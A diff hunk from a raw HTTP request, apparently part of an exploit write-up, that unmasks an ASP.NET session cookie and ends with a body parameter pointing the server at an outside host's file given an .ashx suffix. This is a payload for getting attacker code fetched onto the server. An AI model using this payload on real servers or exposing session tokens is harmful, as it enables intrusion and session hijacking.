@@ -98,7 +98,7 @@ Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Origin: null
 Connection: close
-Cookie: ASP.NET_SessionId=m**********************0
+Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
 Upgrade-Insecure-Requests: 1
 
 source[]=http://xx.xx.xx.xx:50000/1.png?.ashx
